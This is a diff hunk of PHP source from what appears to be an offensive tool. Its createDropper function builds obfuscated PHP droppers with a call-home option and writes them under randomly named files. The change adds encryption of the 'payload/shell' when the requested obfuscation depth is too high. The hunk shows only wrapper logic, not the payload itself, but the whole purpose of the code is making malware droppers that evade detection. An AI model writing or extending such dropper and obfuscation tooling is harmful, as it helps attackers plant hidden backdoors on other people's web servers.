@@ -269,19 +269,21 @@ function createDropper($callHome, $duration, $obfsucate, $depth)
                 case "y":
                     $ob = "includes/droppers/dynamic/obfuscated/".bin2hex(random_bytes(rand(5,25))).".php";
                     if ((int)$depth > 23) {
-                        print("Depth needs to be 23 or lower, too much depth causes the script obfuscation to be redundant.\n");
+                        print("Depth needs to be 23 or lower, too much depth causes the script obfuscation to be redundant.\n Since you want a higher depth, going to encrypt the payload/shell.");
+                        $encrypt = true;
                         $depth = 23;
                     }else{
                         print("Trying randomness with {$depth}\n");
+                        $encrypt = false;
                     }
                     print("Generated dropper will be: {$ob}\n");
-                    $t->begin_junk($file_in, $depth, $ob, "ob");
+                    $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt);
                     system("ls -lah includes/droppers/dynamic/obfuscated");
                     break;
                 case "n":
                     $n = "includes/droppers/dynamic/raw/".bin2hex(random_bytes(rand(5,25))).".php";
                     print("Generated Dropper will be: {$n}\n");
-                    $t->begin_junk($file_in, "0", $n, "n");
+                    $t->begin_junk($file_in, "0", $n, "n", false);
                     system("ls -lah includes/droppers/dynamic/raw");
                     break;
             }
